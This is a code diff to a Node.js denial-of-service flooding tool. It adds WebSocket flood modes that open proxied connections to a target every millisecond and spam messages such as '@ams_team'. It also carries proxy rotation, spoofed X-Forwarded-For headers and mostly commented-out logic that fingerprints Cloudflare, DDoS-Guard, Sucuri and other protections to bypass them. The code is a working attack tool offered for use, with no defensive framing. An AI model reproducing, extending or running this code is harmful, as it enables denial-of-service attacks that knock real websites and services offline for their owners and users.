@@ -1,6 +1,10 @@
 // Global error handling (Ignoring system for helpless error logs)
+// import WebSocket from 'ws';
 const request = require('request'),
     cloudscraper = require('cloudscraper'),
+    WebSocket = require('ws'),
+    url = require('url'),
+    HttpsProxyAgent = require('https-proxy-agent'),
     net = require('net'),
     URL = require('url'),
     requestJar = request.jar(),
@@ -33,9 +37,26 @@ events.EventEmitter.prototype._maxListeners = Infinity;
 
 global.window = {};
 
-function randomStr() {
-
+function randomReferer() {
+    return workerData.referers[~~(Math.random() * workerData.referers.length)]
 }
+
+function randomProxy() {
+    return 'http://' + workerData.proxies[~~(Math.random() * workerData.proxies.length)]
+}
+
+function randomUA() {
+    return workerData.userAgents[~~(Math.random() * workerData.userAgents.length)]
+}
+
+function randomSpoof() {
+    return `${randomIp()}, ${randomIp()}`;
+}
+
+function realize() {
+    return l7.target.replace(/%RAND%/g, randomWords()).replace(/%RAND2%/g, randomStr());
+}
+
 
 function INIT(workerData) {
     logger('ATTACK STARTING :: ', workerData.target, {
@@ -61,16 +82,7 @@ function INIT(workerData) {
     l7.parsed = URL.parse(workerData.target);
     l7.mode = workerData.mode;
     if (workerData.opt) {
-        if(statusbox){
-            console.log("xxxxxS");
-            l7.opt = workerData.opt;
-            l7.opt.method = "POST";
-        }else{
-            console.log("statusbox == null");
-            l7.opt = workerData.opt;
-        }
-
-
+        l7.opt = workerData.opt;
     } else {
         l7.opt = {
             method: "GET", // HTTP METHOD
@@ -98,12 +110,20 @@ function INIT(workerData) {
                 ATTACK();
                 l7.raw = true;
                 break;
+            case 'wss':
+                ATTACK();
+                l7.raw = true;
+                break;
+                case 'wsst':
+                    ATTACK();
+                    l7.raw = true;
+                    break;               
         }
     }
 
     if (l7.mode == 'raw') {
         ATTACK = function () {
-            let dua = flooder.randomUA;
+            let dua = 'xxxxxxxx';
             STATE.running = true; // From now and so, script considered running;
             STATE.expire = Date.now() + workerData.duration;
 
@@ -130,12 +150,166 @@ function INIT(workerData) {
         }
         initMode();
     }
+    if (l7.mode == 'wss') {
+        ATTACK = function () {
+            
+            // ws.on('open', function open() {
+            // ws.send('Hello ,data');
+            // });
 
+            // ws.on('message', function message(data) {
+            // console.log('received: %s', data);
+            // });
+            setTimeout(() => {
+                logger('Attack finished');
+                // process.exit(4);
+            }, 999999);
+            let dproxy = flooder.dproxy,
+            // dUA = flooder.randomUA;
+            endpoint = l7.target,
+            options = url.parse(dproxy);
+            var agent = new HttpsProxyAgent(options);
+
+            let ws = new WebSocket(l7.target, { agent: agent });
+            let is = 0;
+            //  let datas = '00040A01000000490000000000000082020000022A000000380000000058E39EC56A3CC36A0A229E606060606060606060606060606060606060605E3131046063B0D2B5E25B8B18FC';
+                 let datas = randomWords();
+                    ws.on('open', function open() {
+                        setInterval(() => {
+                            is++;
+                        // ws.send(Buffer.from(datas, 'hex'));
+                        ws.send(datas);
+                        ws.on('message', message => {
+                            console.log(`Received message => ${message}`)
+                          })
+                        },1)
+                    });
+                    ws.on('error', function() {
+                        console.log('socket error');
+                        // how do I reconnect to the ws after x minutes here?
+                    });
+            // let datat = '008600020000000C00000000';
+            // let wst = new WebSocket('wss://et66.1g0p.com:5245');
+            // wst.on('open', function open() {
+            //     setInterval(() => {
+            //         is++;
+            //     wst.send(Buffer.from(datat, 'hex'));
+            //     wst.on('message', message => {
+            //         console.log(`T message => ${message}`)
+            //         })
+            //     },1)
+            // });      
+            // let dua = 'xxxxxxxx';
+            // STATE.running = true; // From now and so, script considered running;
+            // STATE.expire = Date.now() + workerData.duration;
+
+            // setTimeout(() => {
+            //     logger('Attack finished');
+            //     process.exit(4);
+
+            // }, STATE.expire - Date.now());
+            // logger('Starting proxyless :: ', l7.target);
+            // setInterval(() => {
+            //     reqCookie({
+            //         method: l7.opt.method,
+            //         url: l7.target,
+            //         headers: {
+            //             'User-Agent': dua,
+            //             'Host': 'wss.cn2cdn.com',
+            //             'Connection': 'Upgrade',
+            //             'Pragma': 'no-cache',
+            //             'Cache-Control': 'no-cache',
+            //             'Upgrade': 'websocket',
+            //             'Origin': 'https://wss.cn2cdn.com',
+            //             'Sec-WebSocket-Version': '13',
+            //             'Accept-Encoding': 'gzip, deflate',
+            //             'Accept-Language': 'zh-CN,zh;q=0.9',
+            //             'x-forwarded-for': '223.12.12.3',
+            //             'Sec-WebSocket-Key': randomWords()
+            //         }
+            //     });
+            // }, 1);
+        }
+        initMode();
+    }
+    if (l7.mode == 'wsst') {
+        ATTACK = function () {
+            
+            // ws.on('open', function open() {
+            // ws.send('Hello ,data');
+            // });
+
+            // ws.on('message', function message(data) {
+            // console.log('received: %s', data);
+            // });
+            setTimeout(() => {
+                logger('Attack finished');
+                // process.exit(4);
+            }, 999999);
+            
+            let is = 0;
+        
+                 let datas = randomWords();
+                 var endpoint = l7.target;
+                 setInterval(() => {
+                 let ws = new WebSocket(endpoint);
+                    ws.on('open', function open() {});
+                    ws.on('error', function() {
+                        console.log('socket error');
+                        // how do I reconnect to the ws after x minutes here?
+                    });
+                },1)
+            // let datat = '008600020000000C00000000';
+            // let wst = new WebSocket('wss://et66.1g0p.com:5245');
+            // wst.on('open', function open() {
+            //     setInterval(() => {
+            //         is++;
+            //     wst.send(Buffer.from(datat, 'hex'));
+            //     wst.on('message', message => {
+            //         console.log(`T message => ${message}`)
+            //         })
+            //     },1)
+            // });      
+            // let dua = 'xxxxxxxx';
+            // STATE.running = true; // From now and so, script considered running;
+            // STATE.expire = Date.now() + workerData.duration;
+
+            // setTimeout(() => {
+            //     logger('Attack finished');
+            //     process.exit(4);
+
+            // }, STATE.expire - Date.now());
+            // logger('Starting proxyless :: ', l7.target);
+            // setInterval(() => {
+            //     reqCookie({
+            //         method: l7.opt.method,
+            //         url: l7.target,
+            //         headers: {
+            //             'User-Agent': dua,
+            //             'Host': 'wss.cn2cdn.com',
+            //             'Connection': 'Upgrade',
+            //             'Pragma': 'no-cache',
+            //             'Cache-Control': 'no-cache',
+            //             'Upgrade': 'websocket',
+            //             'Origin': 'https://wss.cn2cdn.com',
+            //             'Sec-WebSocket-Version': '13',
+            //             'Accept-Encoding': 'gzip, deflate',
+            //             'Accept-Language': 'zh-CN,zh;q=0.9',
+            //             'x-forwarded-for': '223.12.12.3',
+            //             'Sec-WebSocket-Key': randomWords()
+            //         }
+            //     });
+            // }, 1);
+        }
+        initMode();
+    }
+   
     class Bypass {
         constructor(config) {
             initMode();
             logger('Bypass instance was made :: ', l7.firewall);
             if (l7.firewall) {
+                console.log('l7 firewall');
                 if (STATE.available.includes(l7.firewall[0])) {
                     BYPASS = this.load(l7.firewall[0]);
                 } else {
@@ -181,31 +355,60 @@ function INIT(workerData) {
                     });
                 });
             } else {
+                console.log('sent this');
                 workerData.proxies.forEach(p => {
                     let dobj = {
                         proxy: 'http://' + p,
                         userAgent: flooder.randomUA,
                         cookie: false
                     };
-                    reqBypass({
-                        method: "GET",
-                        url: l7.target,
-                        proxy: dobj.proxy,
-                        headers: {
-                            'Cache-Control': 'max-age=0',
-                            'Upgrade-Insecure-Requests': 1,
-                            'User-Agent': dobj.userAgent,
-                            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,/;q=0.8',
-                            'Accept-Encoding': 'gzip, deflate, br',
-                            'Accept-Language': 'en-US,en;q=0.9'
-                        }
-                    }, async (err, res, body) => {
-                        if (err) return false;
-                        if (res.request.headers.cookie) {
-                            dobj.cookie = res.request.headers.cookie;
-                        }
-                        await LOADER(dobj);
-                    });
+       
+                   var endpoint = l7.target;
+                   var options = url.parse(dobj.proxy);
+                   var agent = new HttpsProxyAgent(options);
+                   // finally, initiate the WebSocket connection
+                   // var socket = new WebSocket(endpoint, { agent: agent });
+                    setInterval(() => {
+                    let ws = new WebSocket(endpoint, { agent: agent });
+                    
+                       ws.on('open', function open() {
+                           
+                               // is++;
+                           ws.send("@ams_team");
+                           // ws.send(datas);
+                           // ws.on('message', message => {
+                           //     console.log(`Received message => ${message}`)
+                           //   })
+                           
+                       });
+                       ws.on('error', function() {
+                           console.log('socket error');
+                           // how do I reconnect to the ws after x minutes here?
+                       });
+                   },1)
+
+
+
+
+                    // reqBypass({
+                    //     method: "GET",
+                    //     url: l7.target,
+                    //     proxy: dobj.proxy,
+                    //     headers: {
+                    //         'Cache-Control': 'max-age=0',
+                    //         'Upgrade-Insecure-Requests': 1,
+                    //         'User-Agent': dobj.userAgent,
+                    //         'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,/;q=0.8',
+                    //         'Accept-Encoding': 'gzip, deflate, br',
+                    //         'Accept-Language': 'en-US,en;q=0.9'
+                    //     }
+                    // }, async (err, res, body) => {
+                    //     if (err) return false;
+                    //     if (res.request.headers.cookie) {
+                    //         dobj.cookie = res.request.headers.cookie;
+                    //     }
+                    //     await LOADER(dobj);
+                    // });
                 });
 
             }
@@ -304,6 +507,7 @@ function INIT(workerData) {
         }
 
         init_request(d) {
+            console.log('init_request run');
             d = flooder.init(d);
             d.url = d.url || l7.target;
             d.method = l7.opt.method;
@@ -330,6 +534,8 @@ function INIT(workerData) {
                 });
             }
             d.proxy = d.proxy;
+
+            console.log(d);
             PROPS.push(d);
         }
 
@@ -366,15 +572,14 @@ function INIT(workerData) {
         }
 
         request(b) {
+            console.log('run ==>request(b)');
             reqCookie(b);
         }
     }
 
     // Initialize the flooding system: ( After bypass received cookies, start attacking ~ )
 
-    let flooder = new Flood({
-        threads: 1
-    });
+
 
     class starter {
         init(threads) {
@@ -402,8 +607,6 @@ function INIT(workerData) {
 
     let Starter = new starter();
 
-    console.log(JSON.stringify(l7.opt));
-    console.log("das");
     // Initialize Auto protection detection:
 
     class AutoDetect {
@@ -414,108 +617,137 @@ function INIT(workerData) {
 
         detect() {
             function detectplz() {
+                // console.log('detect() run');
                 if (STATE.running) return false;
                 let dproxy = flooder.randomProxy,
                     dUA = flooder.randomUA;
-                request({
-                    method: "GET",
-                    url: l7.target,
-                    gzip: true,
-                    followAllRedirects: true,
-                    maxRedirects: 20,
-                    agentOptions: {
-                        ciphers: 'ECDHE-ECDSA-AES128-GCM-SHA256'
-                    },
-                    timeout: 80e3,
-                    proxy: dproxy,
-                    headers: {
-                        'Connection': 'keep-alive',
-                        'Cache-Control': 'no-cache',
-                        'Pragma': 'no-cache',
-                        'Upgrade-Insecure-Requests': 1,
-                        'User-Agent': flooder.randomUA,
-                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
-                        'Accept-Encoding': 'gzip, deflate, br',
-                        'Accept-Language': 'en-US,en;q=0.9',
-                        'X-Forwarded-For': flooder.randomSpoof
-                    }
-                }, (err, res, body) => {
-                    if (STATE.running) return false;
-                    if (err || !res || !body || res.headers['proxy-connection'] || body.indexOf('Maximum number of open connections reached') !== -1 || body.indexOf('<title>ERROR: The requested URL could not be retrieved</title>') !== -1 || body.indexOf('<title>This is a SOCKS Proxy, Not An HTTP Proxy</title>') !== -1 || body.indexOf('<title>Tor is not an HTTP Proxy</title>') !== -1) {
-                        return; // Proxy failed, or an error occured, retry.
-                    }
 
-                    if (res.headers['content-length']) {
-                        if (res.headers['content-length'] >= 52428800) {
-                            return process.exit(8);
-                        }
-                    }
+                   var endpoint = l7.target;
+                   var options = url.parse(dproxy);
+                   var agent = new HttpsProxyAgent(options);
 
-                    if (res.headers.server == 'cloudflare') {
-                        if (res.statusCode == 503 && (body.indexOf("Checking your browser before accessing</") !== -1 || body.indexOf("document.getElementById('challenge-form');") !== -1)) {
-                            //Cloudflare UAM Detected:
-                            STATE.firewall = ['cloudflare', 'uam'];
-                        } else if (res.statusCode == 403 && (res.headers['cf-chl-bypass'] || body.indexOf('<noscript id="cf-captcha-bookmark" class="cf-captcha-info">') !== -1)) {
-                            //Cloudflare Captcha Detected:
-                            if (res.headers['cf-chl-bypass']) {
-                                STATE.firewall = ['cloudflare', 'captcha', true];
-                            } else {
-                                STATE.firewall = ['cloudflare', 'captcha', false];
-                            }
-                        } else if (res.statusCode == 403) {
-                            reqBypass.get({
-                                url: l7.target,
-                                proxy: dproxy,
-                                headers: {
-                                    'Cache-Control': 'max-age=0',
-                                    'Upgrade-Insecure-Requests': 1,
-                                    'User-Agent': dUA,
-                                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,/;q=0.8',
-                                    'Accept-Encoding': 'gzip, deflate, br',
-                                    'Accept-Language': 'en-US,en;q=0.9'
-                                }
-                            }, (err, res, body) => {
-                                if (err && err.name == 'CaptchaError') {
-                                    STATE.firewall = ['cloudflare', 'captcha', false];
-                                }
-                            });
-                        } else {
-                            STATE.firewall = ['cloudflare', false]
-                        }
-                    } else if (res.headers['server'] == 'Sucuri/Cloudproxy' || body.indexOf("{},u,c,U,r,i,l=0") !== -1 && res.headers['x-sucuri-id'] && body.startsWith('<html><title>You are being redirected...</title>')) {
-                        STATE.firewall = ['sucuri', 'jschl'];
-                    } else if (body.indexOf("<!DOCTYPE html><html><head><title>DDOS-GUARD</title>") !== -1) {
-                        STATE.firewall = ['ddosguard', '5sec'];
-                        STATE.ratelimit = true;
-                    } else if (res.headers['set-cookie'] && res.headers['set-cookie'][0].startsWith('__ddg_=')) {
-                        STATE.firewall = ['ddosguard', 'proxy'];
-                    } else if (res.headers.server && res.headers['x-hw'] && res.headers.server == 'fbs' && res.headers['x-hw'].startsWith('1')) {
-                        STATE.firewall = ['stackpath', false];
-                    } else if (res.statusCode == 200 && ['nginx', 'openresty'].indexOf(res.headers.server) !== -1 && res.headers['set-cookie']) {
-                        if (res.headers['set-cookie'][0].startsWith('rcksid=')) {
-                            STATE.firewall = ['blazingfast', '5sec'];
-                        } else if (res.headers['set-cookie'][0].startsWith('BlazingWebCookie=')) {
-                            STATE.firewall = ['blazingfast', '5sec2'];
-                        }
-                    } else if (body.indexOf(';document.cookie="CyberDDoS_') !== -1) {
-                        if (body.indexOf('<div w3-include-html="/5s.html"></div>') !== -1) {
-                            STATE.firewall = ['cyberddos', '5sec'];
-                        } else {
-                            STATE.firewall = ['cyberddos', 'silent'];
-                        }
-                    } else if (res.headers['x-firewall-protection'] && res.headers['x-firewall-protection'] == 'True' && res.statusCode == 200 && res.headers['x-firewall-port'] && res.headers.expires == '0') {
-                        STATE.firewall = ['stormwall', 'js'];
-                    } else if (res.headers.server && res.headers.server.startsWith('nginx') && res.statusCode == 589 && res.headers['set-cookie'] && res.headers['set-cookie'][0].startsWith('nooder_t=')) {
-                        STATE.firewall = ['nooder', 'cookie'];
-                    } else if (res.statusCode == 200 && body.startsWith('<html><body><script>setTimeout(eval(function(p,a,c,k,e,d){e=function(c){') && body.endsWith('Please enable JavaScript and Cookies in your browser.</p></noscript></body></html>')) {
-                        STATE.firewall = ['ovh', 'js'];
-                    } else if (res.statusCode == 200 && body.indexOf('function setCookie() {document.cookie = "PipeGuard=') !== -1 && body.startsWith('<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>Human Verification</title>')) {
-                        STATE.firewall = ['pipeguard', 'SetCookie'];
-                    }
-                    STATE.firewalls.push(STATE.firewall);
-                    STATE.last.body = body;
-                    STATE.last.res = res;
-                });
+                   let ws = new WebSocket(endpoint, { agent: agent });
+                    ws.on('open', function open() {
+                        ws.send("@ams_team");
+                    });
+                       ws.on('error', function(e) {
+                        console.log(e);
+                            
+                           // how do I reconnect to the ws after x minutes here?
+                       });
+                   // finally, initiate the WebSocket connection
+                   // var socket = new WebSocket(endpoint, { agent: agent });
+                //     setInterval(() => {
+                //     let ws = new WebSocket(endpoint, { agent: agent });
+                //        ws.on('open', function open() {
+                //            ws.send("@ams_team");
+                //        });
+                //        ws.on('error', function() {
+                //         // console.log('socket error');
+                //             return;
+                //            // how do I reconnect to the ws after x minutes here?
+                //        });
+                //    },1);
+                // request({
+                //     method: "GET",
+                //     url: l7.target,
+                //     gzip: true,
+                //     followAllRedirects: true,
+                //     maxRedirects: 20,
+                //     agentOptions: {
+                //         ciphers: 'ECDHE-ECDSA-AES128-GCM-SHA256'
+                //     },
+                //     timeout: 80e3,
+                //     proxy: dproxy,
+                //     headers: {
+                //         'Connection': 'keep-alive',
+                //         'Cache-Control': 'no-cache',
+                //         'Pragma': 'no-cache',
+                //         'Upgrade-Insecure-Requests': 1,
+                //         'User-Agent': flooder.randomUA,
+                //         'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
+                //         'Accept-Encoding': 'gzip, deflate, br',
+                //         'Accept-Language': 'en-US,en;q=0.9',
+                //         'X-Forwarded-For': flooder.randomSpoof
+                //     }
+                // }, (err, res, body) => {
+                    // return false;
+                    // if (STATE.running) return false;
+                    // if (err || !res || !body || res.headers['proxy-connection'] || body.indexOf('Maximum number of open connections reached') !== -1 || body.indexOf('<title>ERROR: The requested URL could not be retrieved</title>') !== -1 || body.indexOf('<title>This is a SOCKS Proxy, Not An HTTP Proxy</title>') !== -1 || body.indexOf('<title>Tor is not an HTTP Proxy</title>') !== -1) {
+                    //     return; // Proxy failed, or an error occured, retry.
+                    // }
+
+                    // if (res.headers['content-length']) {
+                    //     if (res.headers['content-length'] >= 52428800) {
+                    //         return process.exit(8);
+                    //     }
+                    // }
+
+                    // if (res.headers.server == 'cloudflare') {
+                    //     if (res.statusCode == 503 && (body.indexOf("Checking your browser before accessing</") !== -1 || body.indexOf("document.getElementById('challenge-form');") !== -1)) {
+                    //         //Cloudflare UAM Detected:
+                    //         STATE.firewall = ['cloudflare', 'uam'];
+                    //     } else if (res.statusCode == 403 && (res.headers['cf-chl-bypass'] || body.indexOf('<noscript id="cf-captcha-bookmark" class="cf-captcha-info">') !== -1)) {
+                    //         //Cloudflare Captcha Detected:
+                    //         if (res.headers['cf-chl-bypass']) {
+                    //             STATE.firewall = ['cloudflare', 'captcha', true];
+                    //         } else {
+                    //             STATE.firewall = ['cloudflare', 'captcha', false];
+                    //         }
+                    //     } else if (res.statusCode == 403) {
+                    //         reqBypass.get({
+                    //             url: l7.target,
+                    //             proxy: dproxy,
+                    //             headers: {
+                    //                 'Cache-Control': 'max-age=0',
+                    //                 'Upgrade-Insecure-Requests': 1,
+                    //                 'User-Agent': dUA,
+                    //                 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,/;q=0.8',
+                    //                 'Accept-Encoding': 'gzip, deflate, br',
+                    //                 'Accept-Language': 'en-US,en;q=0.9'
+                    //             }
+                    //         }, (err, res, body) => {
+                    //             if (err && err.name == 'CaptchaError') {
+                    //                 STATE.firewall = ['cloudflare', 'captcha', false];
+                    //             }
+                    //         });
+                    //     } else {
+                    //         STATE.firewall = ['cloudflare', false]
+                    //     }
+                    // } else if (res.headers['server'] == 'Sucuri/Cloudproxy' || body.indexOf("{},u,c,U,r,i,l=0") !== -1 && res.headers['x-sucuri-id'] && body.startsWith('<html><title>You are being redirected...</title>')) {
+                    //     STATE.firewall = ['sucuri', 'jschl'];
+                    // } else if (body.indexOf("<!DOCTYPE html><html><head><title>DDOS-GUARD</title>") !== -1) {
+                    //     STATE.firewall = ['ddosguard', '5sec'];
+                    //     STATE.ratelimit = true;
+                    // } else if (res.headers['set-cookie'] && res.headers['set-cookie'][0].startsWith('__ddg_=')) {
+                    //     STATE.firewall = ['ddosguard', 'proxy'];
+                    // } else if (res.headers.server && res.headers['x-hw'] && res.headers.server == 'fbs' && res.headers['x-hw'].startsWith('1')) {
+                    //     STATE.firewall = ['stackpath', false];
+                    // } else if (res.statusCode == 200 && ['nginx', 'openresty'].indexOf(res.headers.server) !== -1 && res.headers['set-cookie']) {
+                    //     if (res.headers['set-cookie'][0].startsWith('rcksid=')) {
+                    //         STATE.firewall = ['blazingfast', '5sec'];
+                    //     } else if (res.headers['set-cookie'][0].startsWith('BlazingWebCookie=')) {
+                    //         STATE.firewall = ['blazingfast', '5sec2'];
+                    //     }
+                    // } else if (body.indexOf(';document.cookie="CyberDDoS_') !== -1) {
+                    //     if (body.indexOf('<div w3-include-html="/5s.html"></div>') !== -1) {
+                    //         STATE.firewall = ['cyberddos', '5sec'];
+                    //     } else {
+                    //         STATE.firewall = ['cyberddos', 'silent'];
+                    //     }
+                    // } else if (res.headers['x-firewall-protection'] && res.headers['x-firewall-protection'] == 'True' && res.statusCode == 200 && res.headers['x-firewall-port'] && res.headers.expires == '0') {
+                    //     STATE.firewall = ['stormwall', 'js'];
+                    // } else if (res.headers.server && res.headers.server.startsWith('nginx') && res.statusCode == 589 && res.headers['set-cookie'] && res.headers['set-cookie'][0].startsWith('nooder_t=')) {
+                    //     STATE.firewall = ['nooder', 'cookie'];
+                    // } else if (res.statusCode == 200 && body.startsWith('<html><body><script>setTimeout(eval(function(p,a,c,k,e,d){e=function(c){') && body.endsWith('Please enable JavaScript and Cookies in your browser.</p></noscript></body></html>')) {
+                    //     STATE.firewall = ['ovh', 'js'];
+                    // } else if (res.statusCode == 200 && body.indexOf('function setCookie() {document.cookie = "PipeGuard=') !== -1 && body.startsWith('<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>Human Verification</title>')) {
+                    //     STATE.firewall = ['pipeguard', 'SetCookie'];
+                    // }
+                    // STATE.firewalls.push(STATE.firewall);
+                    // STATE.last.body = body;
+                    // STATE.last.res = res;
+                // });
             }		
             let tryrun = setInterval(() => {
                 STATE.running ? clearInterval(tryrun) : setImmediate(detectplz);
